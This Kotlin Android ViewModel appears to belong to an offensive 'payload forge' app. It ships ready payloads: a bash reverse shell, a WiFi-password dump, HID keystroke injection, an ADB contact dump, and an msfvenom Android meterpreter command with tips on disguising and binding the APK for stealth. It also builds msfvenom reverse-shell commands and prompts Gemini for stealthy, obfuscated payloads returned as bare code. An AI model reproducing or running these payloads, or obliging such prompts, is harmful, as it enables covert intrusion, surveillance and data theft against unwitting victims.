package com.example.rabit.ui.payload

import android.app.Application
import android.content.Context
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.gemini.GeminiRepositoryImpl
import com.example.rabit.domain.model.gemini.GeminiRequest
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

data class PayloadTemplate(
    val name: String,
    val os: String,
    val description: String,
    val category: String = "General"
)

class PayloadForgeViewModel(application: Application) : AndroidViewModel(application) {
    private val _payloadCode = MutableStateFlow("")
    val payloadCode = _payloadCode.asStateFlow()

    private val _isGenerating = MutableStateFlow(false)
    val isGenerating = _isGenerating.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error = _error.asStateFlow()

    private val geminiRepo = GeminiRepositoryImpl()
    private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)

    val templates = listOf(
        PayloadTemplate("WiFi Pass Recovery", "Windows", "Export all saved WiFi profiles.", "Recovery"),
        PayloadTemplate("Persistence Link", "Linux", "Add a cronjob or systemd service for persistence.", "Maintenance"),
        PayloadTemplate("Android File Access RAT", "Android", "Full remote filesystem control via APK.", "Mobile"),
        PayloadTemplate("Contact Exfiltration", "Android", "Extract all contacts to remote C2.", "Mobile"),
        PayloadTemplate("SMS Monitor", "Android", "Intercept and log incoming SMS messages.", "Mobile")
    )

    // Pre-built library for offline tactical use
    val prebuiltPayloads = mapOf(
        "WiFi Pass Recovery" to """
            # Windows Tactical WiFi Recovery
            netsh wlan show profiles | Select-String "\:(.+)" | %{${'$'}_.toString().Split(":")[1].Trim()} | %{netsh wlan show profile name="${'$'}_" key=clear} | Select-String "Key Content\W+\:(.+)"
        """.trimIndent(),
        "Reverse Shell" to """
            # Linux One-Liner Tactical Shell
            bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        """.trimIndent(),
        "HID Keyboard Infiltration" to """
            # DuckyScript UI Bypass
            GUI r
            DELAY 500
            STRING cmd
            ENTER
            DELAY 500
            STRING echo You have been audited by Hackie Pro
            ENTER
        """.trimIndent(),
        "Android File Access RAT" to """
            # MSFVENOM COMMAND (Run on your PC/Kali)
            msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -o system_update.apk
            
            # STEALTH NOTE: 
            # 1. Sign the APK using 'jarsigner' to avoid install blocks.
            # 2. Use 'apktool' to bind this payload to a legitimate app for maximum stealth.
        """.trimIndent(),
        "Contact Exfiltration" to """
            # Android Tactical Contact Dump (ADB Required)
            adb shell content query --uri content://contacts/phones --projection display_name:data1
        """.trimIndent()
    )

    fun generatePayload(targetOs: String, goal: String, language: String) {
        val apiKey = prefs.getString("gemini_api_key", "") ?: ""
        if (apiKey.isBlank()) {
            _error.value = "Gemini API Key missing."
            return
        }

        _isGenerating.value = true
        _error.value = null

        viewModelScope.launch {
            try {
                val prompt = """
                    You are a Tactical Payload Architect. Generate a sophisticated security payload for $targetOs.
                    Goal: $goal
                    Language/Format: $language
                    
                    The payload should be:
                    1. Efficient and stealthy.
                    2. Well-commented for an expert security researcher.
                    3. Use modern techniques (e.g. fileless execution, obfuscated strings).
                    
                    Respond ONLY with the code. No explanations.
                """.trimIndent()

                val response = geminiRepo.sendPrompt(GeminiRequest(prompt), apiKey)
                _payloadCode.value = response.text
            } catch (e: Exception) {
                _error.value = e.message
            } finally {
                _isGenerating.value = false
            }
        }
    }

    fun usePrebuilt(name: String) {
        _payloadCode.value = prebuiltPayloads[name] ?: "# Payload not found."
    }

    fun updateCode(newCode: String) {
        _payloadCode.value = newCode
    }

    fun clearError() {
        _error.value = null
    }

    fun generateMsfvenomCommand(platform: String, lhost: String, lport: String): String {
        val payload = when(platform) {
            "Android" -> "android/meterpreter/reverse_tcp"
            "Windows" -> "windows/x64/meterpreter/reverse_tcp"
            "Linux" -> "linux/x64/meterpreter/reverse_tcp"
            "macOS" -> "osx/x64/meterpreter_reverse_tcp"
            else -> "android/meterpreter/reverse_tcp"
        }
        val ext = when(platform) {
            "Android" -> "apk"
            "Windows" -> "exe"
            "Linux" -> "elf"
            "macOS" -> "macho"
            else -> "bin"
        }
        return "msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $ext -o payload.$ext"
    }
}
